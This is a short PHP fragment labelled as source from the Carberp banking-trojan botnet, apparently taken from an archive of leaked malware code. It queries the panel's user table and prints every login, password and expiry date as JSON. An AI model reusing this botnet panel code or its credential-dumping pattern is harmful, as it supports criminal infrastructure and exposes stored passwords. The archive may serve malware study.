/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

$result = $mysqli->query('SELECT id,login,password,expiry_date FROM bf_users');
while($row = $result->fetch_object()){
	$users[] = $row;
}
$users['time'] = time();
print(json_encode($users));
